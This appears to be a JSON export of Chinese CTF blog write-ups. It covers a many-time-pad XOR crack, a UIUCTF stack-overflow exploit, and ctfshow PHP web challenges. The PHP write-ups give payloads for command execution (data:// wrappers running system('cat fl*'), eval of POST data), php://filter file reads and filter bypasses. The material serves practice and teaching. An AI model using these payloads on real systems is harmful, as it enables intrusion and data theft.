class=\"keyword\">and</span> char.isalpha(): counter[indexOfChar] += <span class=\"number\">1</span> <span class=\"comment\"># Increment the counter at this index</span></span><br><span class=\"line\">\tknownSpaceIndexes = []</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> ind, val <span class=\"keyword\">in</span> counter.items():</span><br><span class=\"line\">\t\t<span class=\"comment\"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> val &gt;= <span class=\"number\">7</span>: knownSpaceIndexes.append(ind)</span><br><span class=\"line\">\t<span class=\"comment\">#print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class=\"line\">\txor_with_spaces = strxor(ciphertext.decode(<span class=\"string\">&#x27;hex&#x27;</span>),<span class=\"string\">&#x27; &#x27;</span>*<span class=\"number\">150</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> index <span class=\"keyword\">in</span> knownSpaceIndexes:</span><br><span class=\"line\">\t\t<span class=\"comment\"># Store the key&#x27;s value at the correct position</span></span><br><span class=\"line\">\t\tfinal_key[index] = xor_with_spaces[index].encode(<span class=\"string\">&#x27;hex&#x27;</span>)</span><br><span class=\"line\">\t\t<span class=\"comment\"># Record that we known the key at this position</span></span><br><span class=\"line\">\t\tknown_key_positions.add(index)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)</span></span><br><span class=\"line\">final_key_hex = <span class=\"string\">&#x27;&#x27;</span>.join([val <span class=\"keyword\">if</span> val <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span> <span class=\"keyword\">else</span> <span class=\"string\">&#x27;00&#x27;</span> <span class=\"keyword\">for</span> val <span class=\"keyword\">in</span> final_key])</span><br><span class=\"line\"><span class=\"comment\"># Xor the currently known key with the target cipher</span></span><br><span class=\"line\">output = strxor(target_cipher.decode(<span class=\"string\">&#x27;hex&#x27;</span>),final_key_hex.decode(<span class=\"string\">&#x27;hex&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;Fix this sentence:&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&#x27;&#x27;</span>.join([char <span class=\"keyword\">if</span> index <span class=\"keyword\">in</span> known_key_positions <span class=\"keyword\">else</span> <span class=\"string\">&#x27;*&#x27;</span> <span class=\"keyword\">for</span> index, char <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(output)])+<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># WAIT.. MANUAL STEP HERE </span></span><br><span class=\"line\"><span class=\"comment\"># This output are printing a * if that character is not known yet</span></span><br><span class=\"line\"><span class=\"comment\"># fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class=\"line\"><span class=\"comment\"># and we have our key to fix the entire text!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sys.exit(0) #comment and continue if u got a good key</span></span><br><span class=\"line\"></span><br><span class=\"line\">target_plaintext = <span class=\"string\">&quot;printed on flammable material so that spies could&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;Fixed:&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> target_plaintext+<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">key = strxor(target_cipher.decode(<span class=\"string\">&#x27;hex&#x27;</span>),target_plaintext)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;Decrypted msg:&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> cipher <span class=\"keyword\">in</span> ciphers:</span><br><span class=\"line\">\t<span class=\"built_in\">print</span> strxor(cipher.decode(<span class=\"string\">&#x27;hex&#x27;</span>),key)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;\\nPrivate key recovered: &quot;</span>+key+<span class=\"string\">&quot;\\n&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>运行得到flag</p>\n<h2 id=\"At-Home\"><a href=\"#At-Home\" class=\"headerlink\" title=\"At Home\"></a>At Home</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#chal.py</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> getRandomNBitInteger</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"built_in\">int</span>.from_bytes(<span class=\"string\">b&quot;uiuctf&#123;******************&#125;&quot;</span>, <span class=\"string\">&quot;big&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">a = getRandomNBitInteger(<span class=\"number\">256</span>)</span><br><span class=\"line\">b = getRandomNBitInteger(<span class=\"number\">256</span>)</span><br><span class=\"line\">a_ = getRandomNBitInteger(<span class=\"number\">256</span>)</span><br><span class=\"line\">b_ = getRandomNBitInteger(<span class=\"number\">256</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">M = a * b - <span class=\"number\">1</span></span><br><span class=\"line\">e = a_ * M + a</span><br><span class=\"line\">d = b_ * M + b</span><br><span class=\"line\"></span><br><span class=\"line\">n = (e * d - <span class=\"number\">1</span>) // M</span><br><span class=\"line\"></span><br><span class=\"line\">c = (flag * e) % n</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;e = &#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;n = &#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;c = &#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">e = 359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713</span><br><span class=\"line\">n = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689</span><br><span class=\"line\">c = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869</span><br></pre></td></tr></table></figure>\n\n<p>通过c=(flag*e)%n可得</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c = (flag * e) % n</span><br><span class=\"line\">c * e^-1 = (flag * e * e^-1) % n</span><br><span class=\"line\">c * e^-1 = flag % n</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">e = <span class=\"number\">359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713</span></span><br><span class=\"line\">n = <span class=\"number\">26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689</span></span><br><span class=\"line\">c = <span class=\"number\">67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869</span></span><br><span class=\"line\">d=inverse(e,n)</span><br><span class=\"line\">flag=(c*d)%n</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><h2 id=\"Chainmail\"><a href=\"#Chainmail\" class=\"headerlink\" title=\"Chainmail\"></a>Chainmail</h2><p>一个基础的栈溢出，跳到give_flag的函数即可，但要注意的是在发送give_flag的地址之前要再给他发送一个<code>ret</code>的地址，否则会造成错误的对齐。<code>ret</code>的地址可以用<code>ROPgadget </code>找，命令:<code>ROPgadget --binary chal --only  &#39;ret&#39;</code>。</p>\n<p>exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">a = remote(<span class=\"string\">&quot;chainmail.chal.uiuc.tf&quot;</span>, <span class=\"number\">1337</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">72</span> +p64(<span class=\"number\">0x40101a</span>) + p64(<span class=\"number\">0x401216</span>)</span><br><span class=\"line\">a.sendline(payload)</span><br><span class=\"line\">a.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"peanut-xss\"><a href=\"#peanut-xss\" class=\"headerlink\" title=\"peanut-xss\"></a>peanut-xss</h2><p>XSS学的不是很好，具体怎么解可以看下面的文章:</p>\n<p><a href=\"https://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss\">https://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss</a></p>\n","categories":["ctf"],"tags":["ctf"]},{"title":"chtshow web入门37~40","url":"/2023/01/11/chtshow37-40/","content":"<h1 id=\"web-37\"><a href=\"#web-37\" class=\"headerlink\" title=\"web 37\"></a>web 37</h1><p><img src=\"/pic/web37.png\" alt=\"img\"><br>考察data伪协议，data伪协议需满足allow_url_fopen，allow_url_include同时开启才能使用。<br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=data://text/plain,&lt;?php system(&quot;cat fl*&quot;);?&gt;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web38\"><a href=\"#web38\" class=\"headerlink\" title=\"web38\"></a>web38</h1><p><img src=\"/pic/web38.png\" alt=\"img\"><br>php被过滤了，可以用短标签绕过php。<br>短标签：比<?php ?>更灵活调用的方法  <? /*程序操作*/ ?>  <?=/*函数*/?><br>paylaod：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=data://text/plain,&lt;?=`cat fla*`;?&gt;</span><br><span class=\"line\">/?c=data://text/plain,&lt;?=system(&quot;cat fl*&quot;);?&gt;</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web39\"><a href=\"#web39\" class=\"headerlink\" title=\"web39\"></a>web39</h1><p>include中多了个.php，但是上一题的payload也管用，看别人的wp说是有?&gt;结尾进行闭合，所以没有影响。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;)?&gt;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web40\"><a href=\"#web40\" class=\"headerlink\" title=\"web40\"></a>web40</h1><p><img src=\"/pic/web40.png\" alt=\"img\"><br>这个过滤了不少东西，但是没有过滤英文字母、下划线和英文的括号。<br>可以用提示的方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class=\"line\">show_source()函数对文件进行语法高亮显示</span><br><span class=\"line\">next() 函数将内部指针指向数组中的下一个元素，并输出</span><br><span class=\"line\">array_reverse() 函数以相反的元素顺序返回数组</span><br><span class=\"line\">scandir() 函数返回指定目录中的文件和目录的数组</span><br><span class=\"line\">pos() 函数返回数组中的当前元素的值</span><br><span class=\"line\">localeconv() 函数返回一包含本地数字及货币格式信息的数组</span><br></pre></td></tr></table></figure>\n<p>也可以换其他方法<br>首先</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=print_r(get_defined_vars());</span><br></pre></td></tr></table></figure>\n<p>获得一下信息<br><img src=\"/pic/web40.1.png\" alt=\"img\"><br>使用next获取这个数组的下一个位置的元素，也就是POST的元素.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=print_r(next(get_defined_vars()));</span><br></pre></td></tr></table></figure>\n<p><img src=\"/pic/web40.2.png\" alt=\"img\"><br>然后把这个元素弹出，用array_pop</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=print_r(array_pop(next(get_defined_vars())));</span><br></pre></td></tr></table></figure>\n<p><img src=\"/pic/web40.3.png\" alt=\"img\"><br>最后再用eval执行一下就可以了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=eval(array_pop(next(get_defined_vars())));</span><br></pre></td></tr></table></figure>\n<p>POST数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1=system(&quot;cat flag.php&quot;);或1=echo`cat flag.php`;</span><br></pre></td></tr></table></figure>\n<p>关于echo、print、print_r的区别可以参考：<a href=\"https://blog.51cto.com/zlong37/1556855\">https://blog.51cto.com/zlong37/1556855</a></p>\n<h1 id=\"常用的注释符\"><a href=\"#常用的注释符\" class=\"headerlink\" title=\"常用的注释符\"></a>常用的注释符</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#、--、-- -、//、/**/、/*letmetest*/、;%00</span><br></pre></td></tr></table></figure>\n<h1 id=\"MySQL中可以代替空格的字符\"><a href=\"#MySQL中可以代替空格的字符\" class=\"headerlink\" title=\"MySQL中可以代替空格的字符\"></a>MySQL中可以代替空格的字符</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/**/、()、=、%20、%09、%0a、0x0a、0x0b、0x0c、0x0d、+、-、~、.等等</span><br></pre></td></tr></table></figure>","categories":["web","ctfshow","刷题"],"tags":["ctfshow","刷题","web"]},{"title":"ctfshow web入门101~104","url":"/2023/02/18/ctfshow-web%E5%85%A5%E9%97%A8101~104/","content":"<h1 id=\"web101\"><a href=\"#web101\" class=\"headerlink\" title=\"web101\"></a>web101</h1><p><img src=\"/pic/101.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过echo显示</span><br><span class=\"line\">即使传入了空的括号，代码依旧可以运行，且error_reporting(0)的存在阻止了报错</span><br></pre></td></tr></table></figure>\n<p>v1必须是数字，v2可以使用可以使用反射类new ReflectionClass(),v3没有过滤<code>;</code>。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure>\n<p>0x2d还是-，然后最后一位需要自己猜。</p>\n<h1 id=\"web102\"><a href=\"#web102\" class=\"headerlink\" title=\"web102\"></a>web102</h1><p><img src=\"/pic/102.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">is_numeric() 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true，否则返回false。如果字符串中含有一个e代表科学计数法，也可返回true</span><br><span class=\"line\"></span><br><span class=\"line\">call_user_func() 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数</span><br><span class=\"line\"></span><br><span class=\"line\">file_put_contents() 函数应该都熟悉了，写入内容到文件中，第一个参数是文件名，第二个参数是内容</span><br></pre></td></tr></table></figure>\n<p>要确保v4为真，就要确保v2是数字.将v2进行base64编码然后再转换成16进制。<br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.php</span><br><span class=\"line\">POST：v1=hex2bin</span><br></pre></td></tr></table></figure>\n<p>然后访问2.php查看源码就能找到flag。</p>\n<h1 id=\"web103\"><a href=\"#web103\" class=\"headerlink\" title=\"web103\"></a>web103</h1><p>找不到服务器，做不了题.</p>\n<h1 id=\"web104\"><a href=\"#web104\" class=\"headerlink\" title=\"web104\"></a>web104</h1><p><img src=\"/pic/104.png\"><br>因为没有判断，可以直接让两个值相等，也可以用数组绕过，也可以用两个相等的sha1的值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">aaK1STfY</span><br><span class=\"line\">0e76658526655756207688271159624026011393</span><br><span class=\"line\">aaO8zKZF</span><br><span class=\"line\">0e89257456677279068558073954252716165668</span><br></pre></td></tr></table></figure>\n","categories":["ctfshow","刷题","php特性"],"tags":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门110~125","url":"/2023/03/17/ctfshow-web%E5%85%A5%E9%97%A8110/","content":"<h1 id=\"web110\"><a href=\"#web110\" class=\"headerlink\" title=\"web110\"></a>web110</h1><p><img src=\"/pic/110.png\"><br>考察FilesystemIterator。getcwd()函数 获取当前工作目录 返回当前工作目录。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>\n<p>缺陷是如果flag的文件不在第一位的话，就不能得到这个文件名。</p>\n<span id=\"more\"></span>\n<h1 id=\"web111\"><a href=\"#web111\" class=\"headerlink\" title=\"web111\"></a>web111</h1><p><img src=\"/pic/111.png\"><br>考察 全局变量GLOBALS<br><img src=\"/pic/111.1.png\"><br>要执行这一段函数，v1要等于ctfshow</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class=\"line\">            getFlag($v1,$v2);</span><br><span class=\"line\">    &#125; </span><br></pre></td></tr></table></figure>\n<p>然后再将v2的值赋给v1，再接着getFlag函数，打印v1，v1为全局变量的时候，即可打印出flag。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>\n<h1 id=\"web112\"><a href=\"#web112\" class=\"headerlink\" title=\"web112\"></a>web112</h1><p><img src=\"/pic/112.png\"><br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">php://filter/resource=flag.php</span><br><span class=\"line\">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class=\"line\">php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class=\"line\">compress.zlib://flag.php</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/qq_44657899/article/details/109300335\">php://filter的各种过滤器</a></p>\n<h1 id=\"web113\"><a href=\"#web113\" class=\"headerlink\" title=\"web113\"></a>web113</h1><p><img src=\"/pic/113.png\"><br>payload:<br>可以用zlib伪协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>\n<p>也可以用/proc/self/root</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class=\"line\">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class=\"line\">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class=\"line\">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class=\"line\">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/cosmoslin/article/details/122660083\">proc目录的应用</a><br><img src=\"/pic/114.png\"><br>compress，和非预期都被禁了，但是伪协议放出来了，可以直接使用伪协议读<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"web115\"><a href=\"#web115\" class=\"headerlink\" title=\"web115\"></a>web115</h1><p><img src=\"/pic/115.png\"><br>考察点：trim函数的绕过+is_numeric绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">语法</span><br><span class=\"line\">trim(string,charlist)</span><br><span class=\"line\"></span><br><span class=\"line\">参数\t描述</span><br><span class=\"line\">string\t        必需。规定要检查的字符串。</span><br><span class=\"line\">charlist\t    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;\\0&quot;       - NULL</span><br><span class=\"line\">&quot;\\t&quot;       - 制表符</span><br><span class=\"line\">&quot;\\n&quot;       - 换行</span><br><span class=\"line\">&quot;\\x0B&quot;     - 垂直制表符</span><br><span class=\"line\">&quot;\\r&quot;       - 回车</span><br><span class=\"line\">&quot; &quot;        - 空格</span><br></pre></td></tr></table></figure>\n<p>看师傅的wp才能做出来，在本地测试一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">for($i=0;$i&lt;=128;$i++)&#123;</span><br><span class=\"line\">    $str=chr($i).&quot;1&quot;;</span><br><span class=\"line\">    if(is_numeric($str)&amp;&amp; trim($str)!==&#x27;1&#x27;)&#123;</span><br><span class=\"line\">        echo urlencode(chr($i)).&quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以用%0c换页，<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num=%0c36</span><br></pre></td></tr></table></figure>\n<h1 id=\"web123\"><a href=\"#web123\" class=\"headerlink\" title=\"web123\"></a>web123</h1><p><img src=\"/pic/123.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET或POST的方式传进去的变量名，会自动将空格 + . [ 转换为_,想构造出.，需要前面带上[，后面用.就可以不变成_。</span><br></pre></td></tr></table></figure>\n\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</span><br></pre></td></tr></table></figure>\n<h1 id=\"web125\"><a href=\"#web125\" class=\"headerlink\" title=\"web125\"></a>web125</h1><p><img src=\"/pic/125.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1、cli模式（命令行）下</span><br><span class=\"line\"></span><br><span class=\"line\">\t第一个参数$_SERVER[&#x27;argv&#x27;][0]是脚本名，其余的是传递给脚本的参数</span><br><span class=\"line\"></span><br><span class=\"line\">2、web网页模式下</span><br><span class=\"line\"></span><br><span class=\"line\">\t在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class=\"line\">\t</span><br><span class=\"line\">    设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果</span><br><span class=\"line\"></span><br><span class=\"line\">    这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</span><br><span class=\"line\"></span><br><span class=\"line\">    $argv,$argc在web模式下不适用</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\">get:  $fl0g=flag_give_me;</span><br><span class=\"line\">post:  CTF_SHOW=1&amp;CTF%5bSHOW.COM=1&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure>","categories":["ctfshow","刷题","php特性"],"tags":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门105~109","url":"/2023/02/26/ctfshow-web%E5%85%A5%E9%97%A8105/","content":"<p><img src=\"/pic/105.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($key===&#x27;error&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125; </span><br></pre></td></tr></table></figure>\n<p>这一段说get传的值不能等于error。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">foreach($_POST as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($value===&#x27;flag&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125; </span><br></pre></td></tr></table></figure>\n<p>这一段说POST传的值不能等于flag。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class=\"line\">    die($error);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>这一段说POST传的值不等于flag的话输出变量error。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET:?a=flag</span><br><span class=\"line\">POST:error=a</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web106\"><a href=\"#web106\" class=\"headerlink\" title=\"web106\"></a>web106</h1><p><img src=\"/pic/106.png\"><br>这道题就比web105多一个比较。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET:v2[]=1</span><br><span class=\"line\">POST:v1[]=2</span><br></pre></td></tr></table></figure>\n<h1 id=\"web107\"><a href=\"#web107\" class=\"headerlink\" title=\"web107\"></a>web107</h1><p><img src=\"/pic/107.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">parse_str(string,array)</span><br><span class=\"line\">把查询字符串解析到变量中。</span><br><span class=\"line\">string必选。规定要解析的字符串</span><br><span class=\"line\">array可选。规定存储变量的数组的名称。</span><br></pre></td></tr></table></figure>\n<p>题目就是把v1的值赋给v2，然后让v2的值和v3的MD5值相同。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET:?v3=a</span><br><span class=\"line\">POST:v1=flag=0cc175b9c0f1b6a831c399e269772661</span><br></pre></td></tr></table></figure>\n<p>MD5没办法处理数组。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET:?v3=a</span><br><span class=\"line\">POST:v1=   #空</span><br></pre></td></tr></table></figure>\n<h1 id=\"web108\"><a href=\"#web108\" class=\"headerlink\" title=\"web108\"></a>web108</h1><p>连接不到服务器…..</p>\n<h1 id=\"web109\"><a href=\"#web109\" class=\"headerlink\" title=\"web109\"></a>web109</h1><p>找不到服务器……</p>\n","categories":["ctfshow","刷题","php特性"],"tags":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门126~150","url":"/2023/03/18/ctfshow-web%E5%85%A5%E9%97%A8126/","content":"<h1 id=\"web126\"><a href=\"#web126\" class=\"headerlink\" title=\"web126\"></a>web126</h1><p>与web125差不多</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">get: a=1+fl0g=flag_give_me</span><br><span class=\"line\">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure>\n<h1 id=\"web127\"><a href=\"#web127\" class=\"headerlink\" title=\"web127\"></a>web127</h1><p>绕过方式和web123一样。<br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?ctf show=ilove36d</span><br></pre></td></tr></table></figure>\n<h1 id=\"web128\"><a href=\"#web128\" class=\"headerlink\" title=\"web128\"></a>web128</h1><p><img src=\"/pic/128.png\"><br>考察点：gettext拓展的使用<br>在开启该拓展后 _() 等效于 gettext()<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>\n<h1 id=\"web129\"><a href=\"#web129\" class=\"headerlink\" title=\"web129\"></a>web129</h1><p><img src=\"/pic/129.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">stripos(string,find,start)</span><br><span class=\"line\">返回值：返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE。注释：字符串位置从0开始，不是从1开始</span><br></pre></td></tr></table></figure>\n<p>看别人的wp绕过的姿势有很多啊，但是怎么一到我这里就失灵了啊。只能用php伪协议<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span 